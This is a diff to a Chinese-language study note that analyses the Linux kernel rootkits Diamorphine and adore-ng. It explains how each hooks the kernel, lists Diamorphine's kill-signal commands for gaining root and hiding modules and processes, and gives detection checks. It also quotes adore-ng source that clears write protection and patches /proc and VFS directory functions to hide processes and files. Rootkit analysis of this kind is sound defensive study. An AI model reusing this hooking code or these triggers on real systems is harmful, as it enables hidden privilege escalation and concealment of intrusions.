@@ -1,5 +1,17 @@
 # Diamorphine
 
+### hook思路
+
+直接hook 系统调用表
+
+### 用户态交互思路
+
+```shell
+kill -n 64 1 # 提权
+kill -n 63 1 # 模块隐藏与显示
+kill -n 31 PID # 隐藏进程 (task->flags ^= PF_INVISIBLE)
+```
+
 ### syscall_table 获取
 
 ##### LINUX_VERSION_CODE 《= KERNEL_VERSION(4, 4, 0)
@@ -79,7 +91,106 @@ give_root(void)
 }
 ```
 
+### 与用户之间的通信
+
+通过hook kill 发信号，实现权限提升，以及模块、进程隐藏
+
+### 检查思路
+
+- 由于模块隐藏不彻底，可以通过/sys/module/查找到隐藏的模块
+
+```
+ls /sys/module/diamorphine/
+```
+
+- 由于是通过kill发送控制命令，我们可以通过在普通用户模式下执行
+
+```
+kill -n 64 1
+```
+
+没有该rootkit的情况下，会显示：
+
+```
+-bash: kill: (1) - Operation not permitted
+```
+
+  
+
 # adore-ng
+
+###  用户态交互思路
+
+```c
+/* You can control adore-ng without ava too:
+ *
+ * echo > /proc/<ADORE_KEY> will make the shell authenticated,
+ * echo > /proc/<ADORE_KEY>-fullprivs will give UID 0,
+ * cat /proc/hide-<PID> from such a shell will hide PID,
+ * cat /proc/unhide-<PID> will unhide the process
+ */
+ struct dentry *adore_lookup(struct inode *i, struct dentry *d,
+                            struct nameidata *nd)
+```
+
+### hook 思路
+
+```c
+filep = filp_open("/proc/", O_RDONLY|O_DIRECTORY, 0);
+if (IS_ERR(filep)) 
+	return -1;
+	
+orig_cr0 = clear_return_cr0();
+
+new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
+orig_proc_lookup = new_inode_op->lookup;
+new_inode_op->lookup = adore_lookup; //hook /proc 目录查找函数，实现与用户的交互
+
+```
+
+```c
+int patch_vfs(const char *p, 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+			readdir_t *orig_readdir, readdir_t new_readdir
+#else
+			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
+#endif
+			)
+{
+	struct file_operations *new_op;
+	struct file *filep;
+
+	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
+	if (IS_ERR(filep)) {
+        return -1;
+	}
+	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+	if (orig_readdir)
+		*orig_readdir = filep->f_op->readdir;
+#else
+	if (orig_iterate)
+		*orig_iterate = filep->f_op->iterate;
+#endif
+
+	new_op = (struct file_operations *)filep->f_op;
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+	new_op->readdir = new_readdir;
+#else
+	new_op->iterate = new_iterate;
+	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
+#endif
+
+	filep->f_op = new_op;
+	filp_close(filep, 0);
+	return 0;
+}
+
+patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);//替换目录遍历函数，实现进程隐藏
+patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);//替换目录遍历函数，实现文件隐藏
+```
+
+
 
 ### 模块隐藏
 
